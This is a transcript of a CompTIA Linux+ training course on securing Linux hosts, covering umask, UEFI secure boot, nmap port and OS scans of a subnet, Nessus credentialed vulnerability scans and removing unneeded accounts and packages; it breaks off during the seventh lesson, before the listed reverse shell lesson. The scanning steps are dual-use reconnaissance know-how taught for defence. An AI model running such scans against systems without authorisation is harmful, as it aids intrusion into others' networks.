@@ -1,0 +1,407 @@
+CompTIA Linux+: Securing Linux
+Hardening Linux hosts reduces the potential for security incidents. A wide variety of techniques can be employed to secure the Linux boot process through advanced file system permissions. Begin this course by exploring hardening techniques related to the Linux system. You will discover how Unified Extensible Firmware Interface (UEFI) secure boot can help secure the Linux boot process. Then you will learn how to control default file system permissions with umask, scan for open ports using nmap, and run a vulnerability assessment against a Linux host. Next, you will disable and remove unneeded components and configurations in Linux and configure a reverse shell. Finally, you will find out how to manage advanced file system permissions related to SUID, group ID (GID), and the sticky bit. This course can be used to prepare for the Linux+ XK0-005 certification exam.
+
+Table of Contents
+    1. Video: Course Overview (it_oslsec_04_enus_01)
+
+    2. Video: Linux Hardening (it_oslsec_04_enus_02)
+
+    3. Video: Managing Unified Extensible Firmware Interface (UEFI) Secure Boot (it_oslsec_04_enus_03)
+
+    4. Video: Setting Default File System Permissions with umask (it_oslsec_04_enus_04)
+
+    5. Video: Scanning Linux Hosts for Open Ports (it_oslsec_04_enus_05)
+
+    6. Video: Assessing Linux Security (it_oslsec_04_enus_06)
+
+    7. Video: Disabling and Removing Unnecessary Components (it_oslsec_04_enus_07)
+
+    8. Video: Configuring a Linux Reverse Shell (it_oslsec_04_enus_08)
+
+    9. Video: Managing Advanced File System Permissions (it_oslsec_04_enus_09)
+
+    10. Video: Course Summary (it_oslsec_04_enus_10)
+
+1. Video: Course Overview (it_oslsec_04_enus_01)
+
+In this video, we will discover the key concepts covered in this course.
+discover the key concepts covered in this course
+[Video description begins] Topic title: Course Overview. Your host for this session is Dan Lachance. [Video description ends]
+Hi, I’m Dan Lachance. Hardening Linux hosts reduces the potential for security incidents. A wide variety of techniques can be employed to secure the Linux boot process all the way through to advanced file system permissions.
+
+In this course, I’ll begin with a discussion of hardening techniques related to Linux systems, followed by covering how UEFI secure boot can help secure the Linux boot process.
+
+I will then control default file system permissions with umask. I will scan for open ports using Nmap, and I’ll run a vulnerability assessment against a Linux host.
+
+Next, I will disable and remove unneeded components and configurations in Linux, and I will configure a reverse shell.
+
+Lastly, I will manage advanced file system permissions related to SUID, GUID, and the sticky bit.
+
+This course can be used to prepare for the Linux+ XK0-005 certification exam.
+
+2. Video: Linux Hardening (it_oslsec_04_enus_02)
+
+During this video, you will learn how to secure a Linux system, including user accounts and passwords, as well as securing services and settings.
+secure a Linux system, including user accounts and passwords, as well as securing services and settings
+[Video description begins] Topic title: Linux Hardening. Your host for this session is Dan Lachance. [Video description ends]
+Let’s talk about Linux hardening. So what are we referring to here? What we're really talking about is reducing the attack surface. That means making sure that there are less attack vectors potentially available to malicious actors. And there are many ways that we can achieve that, and we’ll talk about that.
+
+Hardening Linux hosts can be done manually. For example, if you need to edit config files on a Linux machine and disable components and reset weak passwords to more complex, all of that type of stuff can be done individually on Linux hosts.
+
+But when you have a number of Linux hosts with the same configuration requirements on a larger scale, you really need to look at a centralized way to deploy those standard settings. And that can be done using some kind of a centralized configuration management tool such as Ansible or Puppet.
+
+Ideally, we’ll have a tool in place that will also allow us to detect configuration drift. So we have a baseline of security configurations and we check it periodically against devices to make sure they are compliant with those security settings.
+
+Hardening itself comes in many different forms. One way to harden a Linux host is to make sure that the firmware updates have been applied to all hardware. Of course, if you’re running a Linux virtual machine on-premises, this would apply to the underlying hypervisor host running the virtual machines. If it’s in the cloud, you don’t have control of the hardware and firmware updates. That’s the job of the cloud provider.
+
+And then, of course, what’s definitely more prevalent and common is applying software updates, whether we’re talking about applying updates to the Linux kernel itself, other OS components, and software packages.
+
+If you’re using a Debian-based Linux distribution to make sure you’re installing the latest software, or perhaps, even to upgrade what’s installed, you could run sudo apt-get update. What that will do is update your package repository list so you have the latest indexes, so to speak of what’s available.
+
+But you can also run sudo apt-get upgrade, which will take a look at the packages you have installed on your machine. And if there are updates available in those package repositories, it'll actually allow you to upgrade your locally installed packages. So it's important to do the update then before you do the upgrade.
+
+Other hardening techniques would include things like setting complex passwords. If you're going to stick with username and password authentication, you must enforce the use of complex passwords.
+
+Ideally, in a Linux environment, authentication will occur using public and private key pairs. In other words, SSH public key authentication. So in addition to the knowledge of a username, someone connecting to the Linux host would also have to possess a private key file that is related to a public key file stored server side.
+
+A lot of Linux admins will choose to disallow root logins over SSH since root is the super account. Of course, if you are already SSH-ed into the server as somebody else and you know the root password, you could SU, or switch user, to it using the command within that session.
+
+Of course, hardening always involves disabling unused components on the machine. For example, having the Apache web server running on a Linux host when it’s not required only serves to increase the attack surface. Why would you have a web server running if you don't need it? Or maybe, you need the web server stack but only to do certain things.
+
+We’re just using the Apache2 web server as an example. This would apply to any services running on the host. Is it needed, and can we pare it down, strip it down, so to speak, to run only what’s required? The other thing to think about too, is the more stuff you have installed and running that you don’t really need, it also means it'll take longer to apply updates to that host.
+
+Other hardening options would include using a jump box or a VPN or SSH tunneling in order to allow remote management of Linux hosts. In other words, what we don't want to do, we don’t want Linux hosts to be publicly visible over the Internet with a public IP address. Unless it’s absolutely required, such as if it's a public-facing web server.
+
+But even still, you could put it behind some kind of a port forwarding solution, like a reverse proxy to protect it further. So in most secure environments, in order to remotely manage a Linux host, you would have to VPN into the network if you're not already on it, which would mean you could then connect to that host with a private IP address or you would use a jump box to do the same type of thing.
+
+Hardening hosts also means making sure you configure logging appropriately on that device. If you’re managing more than just a handful of Linux hosts, you'll probably want to enable log forwarding to a centralized logging host. And you also need to employ continuous monitoring of those logs.
+
+Having everything logged is great unless nobody's ever looking at them. It doesn't have to be a human being. There could be an automated solution such as a SIEM solution that ingests these forwarded log entries looking for suspicious activity.
+
+And we have encryption. Enabling encryption is always a way to harden a Linux host. Now, there are two ways to look at this. One is at the network level. So using secured connections only to and from the Linux host, maybe using HTTPS instead of HTTP, or connecting via a VPN, using SSH tunneling where everything is transmitted through an encrypted SSH tunnel. Using IPsec to configure encryption, that’s at the network level.
+
+At the local storage level, there are plenty of ways that we can encrypt data.
+
+Using tools like dm-crypt or the Linux Unified Key Setup or LUKS encryption, and other third-party tools.
+
+When we talked about firewalls, we talked about different types of firewalls that were available, including those at the network perimeter level.
+
+But it's always important to ensure, where possible, that every device has its own host-based firewall up and running and configured accordingly.
+
+So at the individual Linux host level, we want to be able to control traffic that’s allowed into and out of that host. How you do that specifically will vary depending on the type of packet-filtering firewall solution you're using.
+
+And of course, if those Linux VMs are running in a public cloud, different public cloud providers have different ways to control how traffic can get into those hosts and how traffic can leave them.
+
+Another important aspect of Linux host hardening would be to install host intrusion detection and prevention systems. An example of this would be using the free open-source snort IDS tool that can be installed on individual Linux hosts. Of course, you can also have IDS and IPS solutions to detect, and perhaps, block suspicious activity at the network perimeter level.
+
+But all of these things together, when done correctly, can greatly reduce the attack surface of Linux hosts to increase the organization’s security posture.
+
+3. Video: Managing Unified Extensible Firmware Interface (UEFI) Secure Boot (it_oslsec_04_enus_03)
+
+Upon completion of this video, you will be able to recognize how UEFI secure boot helps secure Linux environments.
+recognize how UEFI secure boot helps secure Linux environments
+[Video description begins] Topic title: Managing Unified Extensible Firmware Interface (UEFI) Secure Boot. Your host for this session is Dan Lachance. [Video description ends]
+Unified Extensible Firmware Interface, otherwise called UEFI, that’s spelled UEFI, is a standard that supersedes the older BIOS or Basic Input/Output System since 2010.
+
+Like the BIOS, UEFI is what actually kicks in when you power on a device, and it checks the hardware such as memory and attached mass storage devices. But one of the great things about UEFI over the older BIOS is the support for much larger disks.
+
+Instead of being completely text-based at the hardware level, there is a GUI management interface with most support. And it also supports something called secure boot, and we’ll talk about why that’s important for security in just a few moments.
+
+When you boot up a machine, let’s say it’s a blade server in a data center somewhere that you’re running as a Linux host, what you would do is press a specific keyboard combination when you power on the device to enter the UEFI firmware settings. And that keystroke will vary. It might be ctrl+E on the keyboard or F2 to enter the UEFI setup utility. And while you might go in there to enable secure boot, which we’ll talk about, you might also go in there to configure a RAID disk array used by the server or to configure your onboard gigabit Ethernet adapter in some particular way.
+
+So with UEFI secure boot, this is something that we can choose to enable in the firmware UEFI settings. It is not required! But what’s the purpose of secure boot? The purpose of secure boot is to ensure that drivers and operating system files are digitally signed, and they are trusted by the UEFI, the firmware in the machine.
+
+Now this is great because it can mitigate problems from a cybersecurity perspective such as malicious files being installed on a machine through rootkits. So they look like standard operating system files, but in fact, they are malicious.
+
+Well with UEFI secure boot, because those files wouldn’t have a valid digital signature that is trusted, UEFI secure boot would not allow them to load, which can also mean that the operating system won’t start.
+
+At the firmware level with UEFI, we have an allow and deny signature database. And so public keys of trusted certificate authorities are actually stored in the UEFI. As you might imagine, you can update those keys with new trusted public keys.
+
+And if you’re actually creating your own custom kernel drivers, perhaps for specialized hardware, you can digitally sign those custom kernel drivers, make sure the UEFI on appropriate devices has a trusted key from your CA, and those drivers will be able to run properly with UEFI secure boot enabled.
+
+But there are a few things to think about with secure boot. The first of which is that if you’ve got existing operating systems already installed on the machine and the machine at the firmware level has UEFI enabled with secure boot, you're going to have to install Linux in that same mode. You can’t mix and match it. At least not if you want the operating systems to load correctly.
+
+The other thing to consider is make sure your Linux distribution supports UEFI secure boot. Not all of them do, especially when you’re talking about older versions.
+
+Pictured on the screen, we’ve got a screenshot of the boot screen. This is the GRUB boot loader for Linux where we can opt to go into UEFI firmware settings. [Video description begins] The title of the page reads: Enable UEFI in Firmware or Virtual Machine Settings. A screenshot is displayed below it. The header inside reads: GNU GRUB version 2.06. A message is shown below it: Try or Install Ubuntu Server. Three options are given below: Ubuntu Server with the HWE kernel, Boot from next volume, and UEFI Firmware Settings. The configuration details are given at the bottom. [Video description ends]
+
+When you install Linux, you can choose to install it with secure boot enabled and if your Linux distribution supports it, there's no problem. Notice in our screenshot that we’ve got a highlighted area here where we’ve got a boot/efi partition that is created and this is on /dev/sda
+
+That’s what you can expect to see if you’ve got Linux installed with secure boot enabled.
+
+In addition, in our next screenshot at the top, the sudo mount command has been issued and its output has been piped to grep looking for efi. Notice how some of the mounted file systems are related to efi, which again is telling us that this Linux machine is installed with UEFI secure boot enabled. And there’s actually a command that you can issue to check that. It’s the mokutil command with --sb-state, that secure boot state. And if it’s enabled, it’ll return what we have here in our screenshot SecureBoot enabled.
+
+So when a highly secured environment, you might choose to enable UEFI secure boot on all of your hosts to make sure that malicious rootkits won't install malicious operating system or driver files on your hosts. It's one aspect of hardening your Linux environment.
+
+4. Video: Setting Default File System Permissions with umask (it_oslsec_04_enus_04)
+
+Discover how to manage file system permissions defaults with umask.
+manage file system permissions defaults with umask
+[Video description begins] Topic title: Setting Default File System Permissions with umask. Your host for this session is Dan Lachance. [Video description ends]
+Have you ever noticed in Linux that somehow magically when you create a new directory or a file or copy files to a directory, permissions are set automatically by the Linux kernel? Well, that is controlled via the umask setting.
+
+What we can do with umask is take permissions away from what the kernel normally wants to assign by default. [Video description begins] A blank Linux host page is open. The title reads: cblackwell@ubuntu2:~ [Video description ends] So for example, if the kernel wants to assign, let’s say, 666 permissions, now 6 stems from 4 + 2, 4 is read, 2 would be write, that would be read-write for the owner, read-write for the owning group, and read-write for everyone else.
+
+Now if that's what the Linux kernel wants to do by default, what we could do is set a umask let’s say to 022. I'm not setting the umask by just typing these numbers in. I'm just using this as a whiteboard. [Video description begins] The presenter mentions this since the 666 and 022 commands show as: command not found. [Video description ends]
+
+But what happens is we subtract the umask from the default kernel permissions. Let me give you an example of how this really works.
+
+Why don't we start by just running the umask command by itself? [Video description begins] The presenter clears the screen to run the new command. [Video description ends] So notice it returns 0002. Well, let’s ignore the first 0 that’s for the special bit position, whether it’s the special user ID bit or the group ID bit or the sticky bit. I'm only concerned with the last three digits. So for the owning user, owning group, and other, it’s 002.
+
+Let’s examine what happens if we use the touch command to make a new file that we will call newfile1.txt If I do an ll of newfile1.txt, notice the default permissions. So for the owning user, the default permissions are read-write, and that’s it. [Video description begins] The output permission that appears on the screen reads: -rw-rw-r-- 1, for the owning user:cblackwell [Video description ends]
+
+Well, if the default Linux kernel permissions are 6, which is read-write, and we have a 0 in that position, the second 0 here in the umask, we are subtracting everything. So what remains is 6. 6 - 0 is 6. Read-write is 6 because read is 4 and write is 2, 4 + 2 = 6.
+
+The same thing, the same type of logic would apply to the group permissions here, read-write. Well in the group position here. So the third 0 here, because remember the first 0 we’re not looking at right now. 6 - 0 is 6, we end up with 6, read and write.
+
+But for other, the last position here, our umask has a value of 2. 6 - 2 is 4, isn’t it? What a coincidence! That's the numeric value for read or r. So that is the correlation between the umask and default permissions.
+
+But if you really want to, you can modify the umask. Let's say you decide, look, I don’t want other, which is the last three permissions here, [Video description begins] The presenter indicates the last three permissions: r-- [Video description ends] I don't want that set to anything. I only want the owning user to have permissions and the owning group. Well, what would I have to set the umask to then to remove that read?
+
+Well, we know that 6, which is the default kernel wants to assign, minus 2 is 4, which results in r. How do we get that down to 0? Well, I don't know.
+
+Why don’t we change the umask from 002 to 006? So let’s run umask the first 0 for the special bit, then the next 0, we don’t want to take away any permissions for the owner, user, or the group. So three 0s, but then 6. So if we just type umask by itself, now our umask is 0006.
+
+I wonder what would happen if we created a new file now, touch newfile2.txt Let’s just do an ll of things to start with new.
+
+So newfile1, remember how other had permissions in the form of read? Well now with newfile2, what’s been automatically set is that other have no permissions at all because we know the kernel wants to assign 6 by default and we know that 6 - 6 is 0, which results in no permissions at all in that position for other. [Video description begins] The output permission that appears on the screen reads: -rw-rw---- 1 [Video description ends]
+
+Now, you could set the umask, for example, in your login script file if you really wanted to. If I do an ls -a, I’ve got a hidden file here called .bashrc so if I wanted to I could sudo nano .bashrc [Video description begins] A new page opens with the header: GNU nano 6.2 .bashrc. A list of settings details is given below it. [Video description ends] and this is where we can put in any settings that we might want to execute upon sign-in, including the umask but certainly not limited to that.
+
+So let’s test out that behavior. So right now if I type umask, it’s set to what we’ve just configured it for, so 0006. If I do an su - to do a full login for user cblackwell, I'm just opening up another session for the same user just so we can test this without logging in and out.
+
+In that new session, if I type umask, we’re back to the default. [Video description begins] The default umask reads: 0002 [Video description ends] Okay, let’s exit out. Let’s go back into sudo nano and into the .bashrc file. And at the bottom is just as good a place as any. Let’s set the umask to 0006, ctrl+X to save that out.
+
+Let’s once again do an su- to cblackwell and we type in umask and now it’s set to 0006. So if you want this set as a default, and you might for security reasons to prevent others from automatically having read access to newly created files, then this might be something that you would consider.
+
+5. Video: Scanning Linux Hosts for Open Ports (it_oslsec_04_enus_05)
+
+In this video, find out how to use Nmap to scan a Linux host.
+use Nmap to scan a Linux host
+[Video description begins] Topic title: Scanning Linux Hosts for Open Ports. Your host for this session is Dan Lachance. [Video description ends]
+In this demonstration, I’ll be using the Nmap tool to scan Linux hosts looking for open ports. [Video description begins] A blank Linux host page is open. The title reads: cblackwell@ubuntu2:~ [Video description ends]
+
+Now I’m sitting at my Linux server, so I’m going to go ahead and type ip a so we can see what the IP address is. Server IP is 192.168.2.156. In this example, I’m going to be using a different Linux host, and I’ll be scanning this one. So let’s switch over to our other Linux host.
+
+I’ve switched over to my Ubuntu desktop client machine where I’m going to run Nmap scans against my server. [Video description begins] A blank Ubuntu desktop client machine page opens. The header reads: cblackwell@ubuntudesktop1:~ [Video description ends] So the first thing I'll do here is make sure it's installed.
+
+If I were to run, let's say sudo apt install nmap. If it's not installed, and here it wants to install it, then we can install it in this way. [Video description begins] The output of nmap installation appears on the screen. At the bottom, it asks: Do you want to continue? The presenter clicks Y for yes. [Video description ends] In some Linux distributions, you’ll find that Nmap is automatically included. That’s definitely true if you’re using something like Kali Linux.
+
+Okay! So at this point, if I were to run man nmap to look at the manual page, [Video description begins] The presenter clears the screen to run the new command. [Video description ends] it knows what I'm talking about. And of course, it’s important to know what [Video description begins] A new page opens with the header: NMAP (1) Nmap Reference Guide. Some categories are given below it, namely: NAME, SYNOPSIS, DESCRIPTION, and more. Each category has further details. [Video description ends] the command line switches are here when using this. And notice that there are a lot of them for Nmap. I’ll press Q for quit. Let’s go through a few examples.
+
+I’m going to run sudo nmap, and I can specify either a hostname or an IP address or multiple hosts, multiple IPs.
+
+Let’s start with the basics. I’ll put in the IP address of our server, 192.168.2.156. I won’t pass any other command line parameters. Let's just see what we get for output. So this is a very quick way to determine what is running on that target. We have here the SSH daemon listening on TCP port 22. We have a DNS server listening on TCP 53. We have the squid-http proxy also listening on TCP port 3128.
+
+But if I use my up-arrow key, we can also place multiple hosts, let's say by IP address separated by a space. So when I press Enter, it simply has two different [Video description begins] The presenter runs the command: cblackwell@ubuntudesktop1:~$sudo nmap 192.168.2.156 192.168.2.1 [Video description ends] output listings for each of those hosts. So if I just scroll up just a tiny bit here, so I’ve got the report here shown for one of the IP addresses I specified on the command line. And then the second host is shown here, of course, with the different listing of services that are up and running.
+
+Of course, you also get the MAC Address shown here for that device, [Video description begins] The MAC Address reads: 00:0C:29:F5:3D:39 (VMware) [Video description ends] the hardware address assigned at the network card level, whether it’s a virtual NIC or not. [Video description begins] The presenter clears the screen to run the new command. [Video description ends]
+
+We could also run sudo nmap, let’s say against 192.168.2.* if we want it to scan all of the hosts on that network. Naturally, it’s going to take longer to run that type of a scan than it would just on a smaller subset of hosts. Once that’s completed, I can scroll back up through the output for all of the hosts that were discovered over the network that are responding to Nmap port scans.
+
+We’ve got a lot of different things listening here, such as Apple file shares, even a Telnet daemon. Ooh, that’s not good! And that’s one of the purposes of running a network scan is, of course, to discover what’s up and running on the network. For example, here it looks like we’ve got a RokuTV device on the network. But if that’s not allowed on the network and it wasn’t there before, you might wonder, how did that happen? Why is that host on the network? It could be an employee that is doing something on the network, plugging it in. It could be an indication of some kind of network compromise.
+
+You might also do this to see what’s running that shouldn’t be. Why is the Telnet daemon running on this host ending with .54? Telnet is notorious for not being a secure way to remotely manage hosts because it sends all of the transmissions over the network in clear text. It’s just unacceptable in this day and age to be using something like that, even internally.
+
+Let’s not forget that when you run these commands, [Video description begins] The presenter clears the screen to run the new command. [Video description ends] if I use the up-arrow key, remember you can use upward redirection to store that into a file which you can then go through later or attach to an email message and send off to someone that might be interested in that.
+
+Now there are many things I can do, such as sudo nmap maybe all I want to do is see which hosts are up on the network, so -sP the man page is very helpful with this type of thing. And this time again, I’ll give it my 192.168.2.* parameter. All it’s doing here is telling me what’s up on the network, what is responding. So it’s much quicker than doing the previous example where it was scanning also for open ports.
+
+Now what if we want to scan for a specific port number? For example, we know that Telnet is nasty from a security perspective and really shouldn’t be run. So I’m going to go ahead and run sudo nmap -p, for port number 23. Telnet normally listens on that port number, and I can scan my entire network here, 192.168.2.*
+
+Now what I’m looking for is a state of open. Naturally, we don't care if we've got a closed state for Telnet, but we definitely care about open machines. So we’ve got one host here that appears to have Telnet up and running, [Video description begins] The host name reads: PORT STATE SERVICE MAC Address: 00:16:78:44:D2:5C [Video description ends] and we can see the IP address for that given host shown up above as well. [Video description begins] The IP address of the host reads: 192.168.2.54. The presenter clears the screen to run the new command. [Video description ends]
+
+The last thing we’ll do here is run sudo nmap with the -O. Now a -O means we want to do OS fingerprinting to try to determine what OS is running on that host, let’s say 192.168.2.156. Okay! Let’s see what it came up with, what it thinks.
+
+So it’s determined the open port numbers, the MAC Address, it’s got a TCP/IP fingerprint, but it was unable to determine an exact OS match.
+
+So, in some cases, it will be able to tell you if it thinks it’s running a variation of Linux depending on whether the device is firewalled or not, and what is running on it.
+
+6. Video: Assessing Linux Security (it_oslsec_04_enus_06)
+
+Learn how to run a vulnerability scan against a Linux host.
+run a vulnerability scan against a Linux host
+[Video description begins] Topic title: Assessing Linux Security. Your host for this session is Dan Lachance. [Video description ends]
+There are many tools out there that will allow you to assess host security such as for Linux machines. And what I mean by that is not simply performing a port scan, but digging a little bit deeper to see if there are any vulnerabilities that might be exploitable, without exploiting them, on the host.
+
+So really, I’m talking about performing a vulnerability scan of a Linux host, where a penetration test would actively attempt to exploit those weaknesses. Here we just want to identify them.
+
+Here I’ve navigated in my browser to www.tenable.com, where you can download a trial version of Tenable Nessus, which is a network vulnerability scanner which will scan the hosts that you tell it. [Video description begins] A Tenable web browser page is open. The Downloads category is open on it. The page is divided into two sections. On the left pane, a list of options is given, namely: Tenable Nessus Agent, Sensor Proxy, and so on. On the middle pane, the Tenable Nessus category is shown. The Download and Install Nessus option is displayed under it with further configuration details. [Video description ends] You could specify a single host or an entire subnet. This is not the only tool out there that can do it. There are other tools like OpenVAS. VAS is spelled VAS, to name but just a few.
+
+Now, when you install this particular product, Nessus, it installs a tiny web server stack that you connect to with a web browser to further configure it. So I’ve already got this installed, and you’ll notice here down below that you can get this installed on Linux by using the built-in Linux curl command. You can actually copy this command.
+
+There’s a Docker container version of it. So if you’ve got the Docker engine installed says here you can run the Docker pull command. There are virtual machines. [Video description begins] The presenter clicks on the button: Download by curl. A dialog box opens with a URL below it. The copy button is highlighted in the top right-hand corner of the box. The same thing is available with the Docker button as well. [Video description ends] So there are a lot of ways to get this up and running.
+
+So here in my web browser, I've connected to my local host where I've got Nessus running, and in this case, I’ve got it running on Windows. [Video description begins] A web browser page is open with the title: Nessus Professional/Login. The Username and Password field is blank. Two buttons are given below it: Remember Me and Sign In. [Video description ends] But it really makes no difference what platform it’s on, the web app behaves the same.
+
+Notice the default port number 8834. So I’ll specify the credentials that I can set when I get this installed. So the first thing I'm asked here is to specify the targets that I want to scan. [Video description begins] A new page opens. The My Scans folder is open on it. A Welcome to Nessus Professional message box opens up. The Targets field is blank on it. At the bottom, two buttons are given: Close and Submit. [Video description ends]
+
+In this particular example, I'm only going to scan a single Linux host, and its IP address is 192.168.2.156. [Video description begins] The presenter opens a Linux host page. He runs the command: cblackwell@ubuntu2:~$ ip a [Video description ends] So I’ll go ahead and specify 192.168.2.156, and I’ll click Submit. [Video description begins] The presenter returns to the My Scans folder page. He types the IP address on the Targets field of the message box. [Video description ends] And then I’ll choose Run scan. So then I can select that host and choose run scan. And now it says Starting scan.
+
+So it automatically used a policy called Basic Network Scan [Video description begins] A new page opens with the header: My Basic Network Scan. The page is divided into three sections. On the left pane, folders and Resources are shown. On the middle pane, four tabs are given, namely: Hosts, Vulnerability, and so on. The Hosts tab is open with the Target host selected. The Vulnerability status bar is displayed beside it. On the right pane, the Scan details are shown. [Video description ends] and the status is showing as having been completed. So we have a start-end date timestamp.
+
+Now if we take a look here, it looks like we’ve only got, it looks like one medium vulnerability. Now we can even click on the vulnerabilities tab here, where we can see if there are many other vulnerabilities. A lot of them are just informational. For example, there's an informational item here shown for web servers. If I click on it, it shows me things like the squid proxy is there running.
+
+But if I go to the mixed entry, here we go. We’ve got a medium DNS issue of some kind, so a DNS Server Cache Snooping Remote Information Disclosure. Of course, it says, Note: If this is an internal DNS server that’s not accessible from the outside, it might not be a problem. But also at the same time, let's not forget that we also have to have the approach of assuming that we can have attacks from the inside. Not necessarily from employees or contractors, but perhaps, by an infected machine.
+
+So we can go to the All scans view to see any past scans. But notice when we do that, we have a New scan button in the upper right. And because we’re not using the initial pop-up screen to do a scan, look at the options we have. [Video description begins] The presenter clicks on the My Scans folder from the left pane. A new page opens with the header: Scan Templates. Under the Scanner tab, there are three categories: DISCOVERY, VULNERABILITIES, and COMPLIANCE. [Video description ends] Host Discovery, there’s the Basic Network Scan policy that was used, but we have an Advanced Scan, Malware Scan. Even Web Application Test scan, if you’re focusing on checking out if there are any vulnerabilities in web apps. Ransomware scans. So there are plenty of types of scans that can be conducted here, even compliance with things like the PCI DSS security standard if you’re dealing with cardholder information such as for Visa cards or American Express cards.
+
+However, if I click Settings at the top, let’s not forget here, [Video description begins] On the top toolbar, there are two buttons: Scans and Settings. The presenter clicks on Settings. A page opens with the header: About. It is divided into two sections. On the left pane, some settings are given, such as: Advanced, Remote Link, Scanner Health, and more. On the middle pane, five tabs are given, namely: Overview, Software Update, and so on. [Video description ends] if I go to Software Update, we need to make sure that our vulnerability scanning database things we’re looking for is up-to-date here. So you want to make sure that updates are enabled here. You can control the frequency if you really want to. This is important because when you're running your scans, it’s only coded to look for what it knows about.
+
+Let’s go back to Scans here. New scan, let’s do an Advanced scan. Now, when you do this, you can give it a name. [Video description begins] A new page opens with the header: New Scan/Advanced Scan. Four tabs are displayed below it, namely: Settings, Credentials, Compliance, and Plugins. Under the Settings tab, the General Settings option is selected. It has four blank fields: Name, Description, Folder, and Targets. [Video description ends] I’m going to call it DeepScan1. It’ll go into the My Scans folder. But I’m only going to tell it to scan that one host again 192.168.2.156. You can also schedule this. There's a scheduling button. You can also specify credentials for the individual host. Now that's interesting because then it will really be able to do an in-depth analysis of the machine.
+
+Now you might wonder, why would I want that? I want to see what attackers can see. Well, that’s true too. But what if there's some kind of an internal attack? Maybe the machine has been compromised, it’s infected. Sometimes, you’ll want to see what kind of a vulnerability list you get from that perspective.
+
+So maybe, I’ll click SSH here and just specify password authentication with a username, and I’ll specify the password here. [Video description begins] Under the Credentials tab, the presenter selects the SSH host. A dialog box appears with five blank fields: Authentication method, Username, Private key passphrase, Elevate privileges with, and Target to prioritize credentials. [Video description ends] And I’ll tell it to escalate or elevate privileges using sudo. The default here is to escalate to root. And I’ll put in the sudo password, which is for my user account, of course, cblackwell.
+
+I can also check for compliance by going to the Compliance tab with a number of security standards.
+
+And under Plugins, I’ll get a sense of what it is it’s going to check. I’m okay with all of this, so I’m going to go ahead and choose Save. [Video description begins] Under the Plugins tab, all the plugins are enabled. [Video description ends] There’s DeepScan1, so I can select it, and I can click the launch button over to the far right.
+
+Notice that now DeepScan1 shows up at the top of the list and it’s currently running. I can click on it to see what it’s doing.
+
+So you can’t really discuss security without discussing vulnerability scanning. This is not a one-time effort. This needs to be periodic recurring. And that frequency will really depend on your organizational security policies. But it’s important to know what our security posture is by running these scans on a frequent basis.
+
+7. Video: Disabling and Removing Unnecessary Components (it_oslsec_04_enus_07)
+
+During this video, discover how to disable and remove unneeded components and tweak kernel parameters.
+disable and remove unneeded components and tweak kernel parameters
+[Video description begins] Topic title: Disabling and Removing Unnecessary Components. Your host for this session is Dan Lachance. [Video description ends]
+One aspect of hardening Linux hosts is making sure you’re only running what is absolutely necessary because this way, you would be reducing the attack surface. When you reduce the attack surface, it means there’s less that potentially could serve as an attack vector for malicious actors. [Video description begins] A blank Linux host page is open. The title reads: cblackwell@ubuntu2: ~ [Video description ends]
+
+So we’re going to take a look at some things to consider disabling or removing from a Linux host.
+
+Now the first thing to bear in mind is that if you were to run sudo tail /etc/passwd, we’ll just look at the last couple of entries of that file. Having a sense of whether all of these user accounts are actually required or not because what you could then do is run sudo last. This will give us a list of user accounts.
+
+Shown in the leftmost column, the terminal they signed in from, if they’ve ever signed in like pts/0 is pseudo terminal 0. That’s a remote connection normally through SSH.
+
+We have the IP address shown here, and we’ve got the date and time stamp with a duration. [Video description begins] A list of user accounts appears on the screen as output. The presenter points to a user account name: cblackwell. Its IP address reads: 192.168.2.11, date: Jun 27, and Timestamp: 07:18 - 07:20. [Video description ends] Naturally, this is going to be important to see who's been logging in and when.
+
+As we scroll back up through the list, we see that most of the activity, in this case, is for user cblackwell. So we know that that’s a valid account that we would not want to remove.
+
+In the same way, we might run sudo who to see who is currently logged in. Here I’ve got my cblackwell account shown here with numerous pseudo terminals. As well as locally on the server terminal itself, which is showing up here as tty1. So notice the lack of an IP address there, so we know it’s an active account.
+
+I can also run sudo lastlog. This one's interesting because it'll show all of the accounts, including the system or Daemon accounts, and whether or not they’ve ever been used to log in, which can be eye-opening.
+
+So part of hardening Linux would be to determine which user accounts really don’t need to be there. Maybe they can be disabled or entirely removed. Any user account would be considered a part of the operating system in terms of components.
+
+[Video description begins] The presenter clears the screen to run the new command. [Video description ends] For example, if I were to run sudo passwd, I could use -l to lock an account, such as mbishop, so that user account cannot be used to sign in. [Video description begins] A message appears on the screen as an output. It reads: password expiry information changed. [Video description ends] Of course, we could run the same command except change the -l to -u for unlock. Or, of course, we could run sudo userdel and simply specify the user account we want removed.
+
+The other thing that’s very important is to determine which software packages are installed. Of course, this is going to be a prime thing to focus on when you’re thinking about what to remove or disable.
+
+If I run sudo apt list and just press Enter and that command will vary depending on the distribution of Linux you’re using. But here in Ubuntu, which is Debian-based, we can use the apt command set. Anyways, here I’ve got a list of all of the software packages installed, and of course, their versions. [Video description begins] The presenter clears the screen to run the new command. [Video description ends]
+
+Now that’s quite the output. So, of course, we could pipe that command to grep and look for something very specific, let’s say python. So then we have all of the python specific components that are installed shown along with their versions.
+
+Of course, we can also run sudo ps -aux [Video description begins] The presenter clears the screen to run the new command. [Video description ends] to see all running processes, even those not tied to this user terminal. We see the command that was used to spawn it shown over on the right. [Video description begins] A partially displayed table appears on the screen as the output. There are eleven columns with headers, such as: USER, STAT, COMMAND, and so on. The presenter points to the first user command: /sbin/init. He scrolls down to view the next screenful of output. [Video description ends]
+
+So sometimes, you might see things that are running, and you might wonder, do I need that component to be running in the background? And that can help you determine which components you might remove, for example, sudo apt remove apache2. [Video description begins] The presenter clears the screen to run the new command. [Video description ends] So if the Apache web server is there, it'll ask me if I want to continue removing it. I'm going to type in the letter Y for yes.
+
+So not only am I freeing up disk space, but I’m removing a component, that if we know that it is not needed, then we are then reducing the attack surface. Having a web server running where you don’t need it running is definitely a security no-no.
+
+The other aspect to consider is on Linux client devices if you have them. Here I’ve got Ubuntu desktop running. So in the same way, we need to be able to find out what is installed and whether or not it really needs to be installed. In the same way, we should also consider our Linux client machines if we have any out on the network under our control. Ideally, they will be centrally managed by some kind of a configuration management tool which determines how they get updated, what software is allowed to be installed on them, and whatnot.
+
+However, here in Ubuntu desktop, I’m going to start by opening up my menu. And I’m going to search for the word software, and I’m going to choose Ubuntu Software. This is kind of like a modern app store you would find on any type of device, [Video description begins] A new page opens with the title: Ubuntu Software. On the top toolbar, three tabs are given: Explore, Installed, and Updates. On the middle pane under Explore, the Editor's Choice category is shown with different applications. [Video description ends] but what I'm primarily interested in are two things.
+
